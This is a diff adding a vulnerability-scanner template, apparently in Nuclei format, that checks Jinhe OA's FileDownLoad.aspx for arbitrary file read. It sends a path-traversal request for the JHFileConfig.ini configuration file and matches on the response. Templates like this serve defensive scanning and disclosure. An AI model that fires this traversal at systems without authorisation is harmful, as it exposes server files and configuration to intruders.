@@ -1,0 +1,24 @@
+id: poc-yaml-jinhe-oa-filedownload-aspx-anyfile-read
+info:
+  name: Jinhe OA FileDownLoad.aspx Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[JHFile]"
+          - "FolderTotal="
+      - type: word
+        part: header
+        words:
+          - "filename=JHFileConfig.ini"
